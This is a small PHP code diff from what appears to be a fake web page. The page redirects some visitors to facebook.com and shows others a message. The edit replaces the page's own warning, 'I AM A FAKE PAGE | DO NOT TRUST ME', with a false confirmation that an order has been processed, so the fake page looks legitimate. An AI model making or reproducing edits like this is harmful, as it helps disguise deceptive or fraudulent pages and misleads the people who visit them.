@@ -8,7 +8,7 @@ if($myFile == $searchString) {
     header('Location: https://facebook.com/');
 }
 if($myFile != $searchString) {
-    echo "***ALERT! I AM A FAKE PAGE | DO NOT TRUST ME";
+    echo "***Your order has been procced ";
 }
 exit();
 ?>
